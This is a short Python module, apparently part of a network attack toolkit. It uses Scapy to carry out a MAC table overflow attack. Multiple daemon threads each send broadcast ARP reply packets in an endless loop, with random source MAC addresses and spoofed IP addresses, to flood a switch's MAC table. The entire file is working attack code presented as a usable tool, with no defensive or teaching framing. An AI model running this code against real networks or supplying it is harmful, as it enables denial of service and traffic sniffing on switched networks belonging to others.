from scapy.all import *
from func.spoof_addr import spoof_addr
from func.random_mac import random_mac
from time import sleep
import threading
import traceback

def mactableoverflow(THREAD_COUNT,quiet,terminal):
    try:
        all_threads=[]
        terminal.write('\n[+] Overflowing MAC table')
        for i in range(int(THREAD_COUNT)):
            t = threading.Thread(target=__send_macs,args=(quiet,terminal))
            t.daemon=True
            all_threads.append(t)

        for i in all_threads:
            i.start()

        all_threads[0].join()
    except Exception as s:
        terminal.write('\n'+str(s))
        traceback.print_exc()

def __send_macs(quiet,terminal):
    try:
        spoofaddr=spoof_addr(terminal=terminal)
        packet = Ether(src=random_mac(),dst='ff:ff:ff:ff:ff:ff')/ARP(op=2,psrc=spoofaddr,hwdst='ff:ff:ff:ff:ff:ff')
        while True:
            send(packet,verbose=0)
            if not quiet:
                terminal.write('\n[+] Packet successfully sent \n[+] Packet: '+packet.summary())
    except Exception as s:
        terminal.write('\n'+str(s))
        traceback.print_exc()
